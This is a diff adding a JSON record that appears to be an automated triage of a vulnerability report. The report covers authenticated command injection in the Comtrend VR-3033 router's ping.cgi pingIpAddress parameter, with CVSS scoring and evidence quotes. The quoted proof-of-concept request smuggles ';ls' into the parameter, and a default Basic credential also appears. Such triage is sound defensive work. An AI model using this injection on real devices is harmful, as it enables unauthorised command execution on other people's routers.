@@ -1,0 +1,73 @@
+{
+  "proposal": {
+    "is_vulnerability_report": true,
+    "summary": "Authenticated command injection in the Comtrend VR-3033 router's diagnostic Ping and Traceroute web interface allows command execution via the pingIpAddress parameter, demonstrated by injecting ';ls' and receiving directory listing output.",
+    "affected_product": "Comtrend VR-3033, firmware DE11-416SSG-C01_R02.A2pvI042j1.d26m",
+    "cwe": "CWE-77",
+    "cwe_quote": "on the text input, type 'google.fr;ls - l'\n5 - a list of folder names should appear.",
+    "cvss": {
+      "AV": {
+        "value": "N",
+        "quote": "GET /ping.cgi?pingIpAddress=google.fr;ls&sessionKey=1039230114 HTTP/1.1"
+      },
+      "AC": {
+        "value": "L",
+        "quote": ""
+      },
+      "PR": {
+        "value": "L",
+        "quote": "Authorization: Basic dXNlcjp1c2Vy"
+      },
+      "UI": {
+        "value": "N",
+        "quote": "GET /ping.cgi?pingIpAddress=google.fr;ls&sessionKey=1039230114 HTTP/1.1"
+      },
+      "S": {
+        "value": "U",
+        "quote": ""
+      },
+      "C": {
+        "value": "L",
+        "quote": "5 - a list of folder names should appear."
+      },
+      "I": {
+        "value": "L",
+        "quote": "5 - a list of folder names should appear."
+      },
+      "A": {
+        "value": "L",
+        "quote": "5 - a list of folder names should appear."
+      }
+    },
+    "recommended_next_step": "Request firmware confirmation and vendor fix; obtain vulnerable device or firmware to reproduce and identify exact command execution impact, then develop and verify a vendor patch or mitigation (sanitize input or restrict diagnostic commands to admin only).",
+    "confidence": "high",
+    "evidence_quotes": [
+      {
+        "claim": "Demonstrated injection payload and expected result",
+        "quote": "on the text input, type 'google.fr;ls - l'\n5 - a list of folder names should appear."
+      },
+      {
+        "claim": "PoC HTTP request showing injection parameter",
+        "quote": "GET /ping.cgi?pingIpAddress=google.fr;ls&sessionKey=1039230114 HTTP/1.1"
+      },
+      {
+        "claim": "Response contains directory listing (command output)",
+        "quote": "<td>bin\n</td><br>\n   </tr>\n   <tr>\n      <td>bootfs\n</td><br>\n   </tr>\n   <tr>\n      <td>data\n</td><br>\n   </tr>\n   <tr>\n      <td>debug\n</td><br>\n   </tr>"
+      },
+      {
+        "claim": "Authentication in request",
+        "quote": "Authorization: Basic dXNlcjp1c2Vy"
+      },
+      {
+        "claim": "Vulnerable product and firmware",
+        "quote": "Firmware version :\nDE11-416SSG-C01_R02.A2pvI042j1.d26m"
+      }
+    ]
+  },
+  "usage": {
+    "input_tokens": 2789,
+    "output_tokens": 758,
+    "latency_s": null,
+    "batch": true
+  }
+}
